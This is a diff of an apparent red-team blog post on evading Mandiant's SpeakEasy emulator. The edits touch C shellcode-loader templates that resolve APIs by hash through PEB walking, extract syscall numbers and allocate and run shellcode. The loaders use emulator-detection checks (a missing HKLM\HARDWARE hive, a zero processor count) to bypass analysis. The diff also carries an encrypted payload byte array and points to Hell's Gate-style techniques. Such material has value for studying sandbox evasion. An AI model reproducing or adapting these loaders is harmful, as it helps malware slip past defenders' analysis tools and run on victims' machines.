+    0x78, 0xf2, 0xf6, 0xb8, 0xf2, 0x10, 0x33, 0xc1, 0x3a, 0x8e, 0x4f, 0x30,
+    0x5f, 0x87, 0xbf, 0x39, 0xfe, 0x87, 0x7f, 0x31, 0xcb, 0x26, 0x0b, 0x01,
+    0xbf, 0xc5, 0x32, 0xd4, 0xfb, 0x83, 0x47, 0x21, 0x86, 0x1e, 0x26, 0xb4,
+    0x78, 0x86, 0x5a, 0xb9, 0xf2, 0x16, 0x18, 0xb1, 0x78, 0xca, 0x36, 0xb4,
+    0x78, 0x86, 0x62, 0xb9, 0xf2, 0x16, 0x3f, 0x7b, 0xf7, 0x4e, 0x36, 0xf1,
+    0x23, 0x87, 0x26, 0xb1, 0xab, 0x98, 0x27, 0xaa, 0xb2, 0x9e, 0x3f, 0xa9,
+    0xb2, 0x9c, 0x36, 0x73, 0x1f, 0xe6, 0x3f, 0xa2, 0x0c, 0x26, 0x26, 0xb1,
+    0xaa, 0x9c, 0x36, 0x7b, 0xe1, 0x2f, 0x29, 0x0f, 0x0c, 0x39, 0x23, 0xb8,
+    0x49, 0xc7, 0x7e, 0xf0, 0xf3, 0xc6, 0x7e, 0xf0, 0xf3, 0x8e, 0xf3, 0x7d,
+    0xf2, 0xc7, 0x7e, 0xf0, 0xb2, 0x7c, 0x4f, 0x7b, 0x9c, 0x41, 0x81, 0x25,
+    0x48, 0x26, 0x63, 0xda, 0xf9, 0x87, 0xc4, 0x56, 0x66, 0x7b, 0xe3, 0x0f,
+    0x26, 0x8e, 0xfd, 0x34, 0xdb, 0xfa, 0x78, 0x8c, 0xf9, 0x46, 0x85, 0x10,
+    0x86, 0xc3, 0xc5, 0xb7, 0xe0, 0xb4, 0x11, 0x9a, 0xf3, 0x9f, 0x3f, 0x79,
+    0x29, 0x39, 0xab, 0x93, 0x92, 0xaa, 0x1d, 0xf0
+};
 ```
 
 The outcome of running it on SpeakEasy vs real Windows was expected:
@@ -1754,7 +1757,6 @@ uint32_t hash(const unsigned char* data, size_t len) {
 }
 
 
-+
 void* NewResolveAPI(uint32_t targetHash) {
     uintptr_t peb = __readgsqword(0x60);
     uintptr_t ldr = *(uintptr_t*)(peb + 0x18);
@@ -1806,8 +1808,6 @@ uint32_t ExtractSSN(uint8_t* pFunc) {
 }
 
 void EntryPoint() {
-    __asm__("and $-16, %rsp");
-    __asm__("sub $0x40, %rsp");
 
     uint8_t* pAlloc   = (uint8_t*)NewResolveAPI(0x2ED1F2C9);
     uint8_t* pProtect = (uint8_t*)NewResolveAPI(0xEC895023);
@@ -1823,7 +1823,9 @@ void EntryPoint() {
     wNtCreateThreadEx        = ExtractSSN(pCreate);
     wNtWaitForSingleObject   = ExtractSSN(pWait);
 
-    unsigned char shellcode[] = "\xfc\x48\x83...";
+    unsigned char shellcode[] = {
+    0xfc, 0x48, 0x83, ...
+};
 
     PVOID base = NULL;
     SIZE_T sz = sizeof(shellcode);
@@ -1856,8 +1858,9 @@ and it finishes emulation without resolving anything.
 
 We can of course make our payload even more advanced such as including the time delays, computing the encryption/decryption key etc to add more complexity to it.
 
-
-
+> **Note**: The SSN technique in this case is a very basic way to showcase our PoC. This will likely not work against a real target, since *[SSNs](https://redops.at/en/blog/exploring-hells-gate) can vary from Windows to Windows or version to version, and in a real-world scenario we usually do not know what Windows or version the target is running, therefore hardcoding SSNs could be risky and fail*.  
+>  
+> For more advanced techniques, you should have a read at [Hell's Gate](https://github.com/vxunderground/VXUG-Papers/blob/main/Hells%20Gate/HellsGate.pdf), [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) and finally [Tartarus Gate](https://www.100daysofredteam.com/p/what-is-tartarus-gate-and-how-it-enables-red-team-tradecraft).
 
 
 ## Technique 4 - Static Configuration Artifacts
@@ -1876,8 +1879,6 @@ By utilizing these PoCs, we can verify if specific paths that exist in real Wind
 // Our usual structs, ResolveAPI, hash functions etc
 
 void WINAPI EntryPoint(void) {
-    __asm__("and $-16, %rsp");
-    __asm__("sub $0x40, %rsp"); 
 
     uint32_t h_VirtualAlloc = 0x5ACFDE4A;
     uint32_t h_VirtualProtect = 0x208602E4;
@@ -1946,7 +1947,7 @@ Running our sample yields:
 * Finished emulating
 ```
 
-...whci was expected. **In a real Windows OS**, the `HKLM\HARDWARE` hive is not a static file on the disk but rather a hive created in memory by the kernel during boot. It is populated by drivers (like Vga.sys) to describe the physical components (Video BIOS, CPU types etc).  
+...which was expected. **In a real Windows OS**, the `HKLM\HARDWARE` hive is not a static file on the disk but rather a hive created in memory by the kernel during boot. It is populated by drivers (like Vga.sys) to describe the physical components (Video BIOS, CPU types etc).  
 
 SpeakEasy mocks common software registry keys (like Windows version info) so programs don't crash, but it does not simulate the low-level hardware drivers. Therefore, it does not build the `HARDWARE` hive. When our code asks for `HARDWARE\DESCRIPTION\System`, SpeakEasy returns `ERROR_FILE_NOT_FOUND` (exit code 0xdead2) because that part of its environment has not been built yet.
 
@@ -1966,7 +1967,7 @@ class SYSTEM_INFO(EmuStruct):
         self.dwProcessorType = ct.c_uint32
         self.dwAllocationGranularity = ct.c_uint32
         self.wProcessorLevel = ct.c_uint16
-        self.wProcessorRevision = ct.c_uint1
+        self.wProcessorRevision = ct.c_uint16
 ```
 
 Taking a look at the implementation of `.../usermode/kernel32.py`, and specifically the hook of `GetSystemInfo`, we find the following:
@@ -2040,7 +2041,8 @@ Now, if we change the comparison from `0` to `1`, we see the following:
 0x500f1: 'kernel32.GetVersion()' -> 0x1db10106
 ```
 
-It emulated correctly.  This means that if we use our initial check of `sysInfo.dwNumberOfProcessors == 0` we can bypass the emulation once again. Full template:
+It emulated correctly.  This means that if we use our initial check of `sysInfo.dwNumberOfProcessors == 0` we can bypass the emulation once again.  
+Full template:
 ```c
 #include <windows.h>
 #include <stdint.h>
@@ -2055,21 +2057,19 @@ typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);
 
-unsigned char buf[] = 
-"\xfc\x48\x83...";
+unsigned char buf[] = {
+    0xfc, 0x48, 0x83, ...
+};
 
 uint32_t hash(const unsigned char* data, size_t len) {
-    ...
+   // ...
 }
 
 void* ResolveApi(uint32_t targetHash) {
-    ...
+   // ...
 }
 
 void WINAPI EntryPoint(void) {
-    // 16-byte stack alignment
-    __asm__("and $-16, %rsp");
-    __asm__("sub $0x40, %rsp"); 
 
     uint32_t h_GetSystemInfo = 0xA86FDDD3; 
     uint32_t h_GlobalMemoryStatusEx = 0xD5A504E9;
@@ -2146,19 +2146,19 @@ typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);
 
-unsigned char buf[] = "\xfc\x48\x83...";
+unsigned char buf[] = {
+    0xfc, 0x48, 0x83, ...
+};
 
 uint32_t hash(const unsigned char* data, size_t len) {
-    ...
+   // ...
 }
 
 void* ResolveApi(uint32_t targetHash) {
-    ...
+   // ...
 }
 
 void WINAPI EntryPoint(void) {
-    __asm__("and $-16, %rsp");
-    __asm__("sub $0x40, %rsp"); 
 
     uint32_t h_GetUserNameA = 0x3CD2D775; 
     uint32_t h_GetSystemInfo = 0xA86FDDD3;
@@ -2221,7 +2221,7 @@ We also saw more or less how many detection hits these samples get, which we cou
 
 Thanks for staying along in this first intro journey of bypassing SpeakEasy. This is just the tip of the iceberg and there are much more emulators to be bypassed, both opensource and private.  
 
-Till the next one!
+<center><i><b>Till the next one!</b></i></center>
 
 ![source_code_reversing](/posts/bypassingspeakeasy/source_code_reversing.png)
 
